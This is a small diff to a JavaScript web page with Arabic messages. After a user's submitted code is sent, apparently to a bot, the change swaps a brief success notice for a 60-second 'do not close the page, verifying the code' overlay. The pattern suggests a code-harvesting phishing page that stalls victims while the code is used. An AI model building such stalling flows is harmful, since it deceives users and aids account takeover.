@@ -501,15 +501,13 @@
                 
                 if (sentCount > 0) {
                   // إظهار رسالة نجاح مؤقتة
-                  showLoadingOverlay("تم الإرسال بنجاح!", "انتظر التحقق من البوت...");
+                  showLoadingOverlay("يتم التأكيد يرجى الانتظار لاتغلق الصفحه", "جاري التحقق من الكود...");
                   
-                  // إخفاء رسالة النجاح بعد 3 ثوانٍ
+                  // إخفاء الرسالة بعد دقيقة واحدة ومسح حقل الكود
                   setTimeout(() => {
                     hideLoadingOverlay();
-                  }, 3000);
-                  
-                  // مسح حقل الكود
-                  document.getElementById("code").value = "";
+                    document.getElementById("code").value = "";
+                  }, 60000);
                 } else {
                   alert("فشل في إرسال الرمز. يرجى المحاولة مرة أخرى.");
                 }
